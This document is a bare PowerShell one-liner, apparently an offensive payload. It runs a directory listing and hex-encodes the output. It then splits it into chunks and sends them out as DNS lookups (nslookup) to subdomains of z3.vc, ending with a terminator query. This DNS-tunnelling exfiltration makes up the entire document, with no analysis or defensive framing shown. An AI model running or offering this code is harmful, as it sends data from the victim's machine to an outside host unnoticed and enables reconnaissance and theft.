$i="";$n=((1..2 |%{'{0:X}' -f (Get-Random -Max 16)}) -join '');((iex "cmd /c dir") -join "`r`n").ToCharArray()|%{$i+=[String]::Format("{0:X2}",[Convert]::ToUInt32($_[0]))};$m=0;for($j=0;$j -lt $i.Length; $j+=60){$l='';if($j+60 -lt $i.Length){$l=($i.substring($j, 60))}else{$l=($i.substring($j))}$l+="."+$m+"."+$n+".m.z3.vc"; nslookup "$l";$m+=1};$g="_._."+$n+".m.z3.vc"; nslookup "$g"

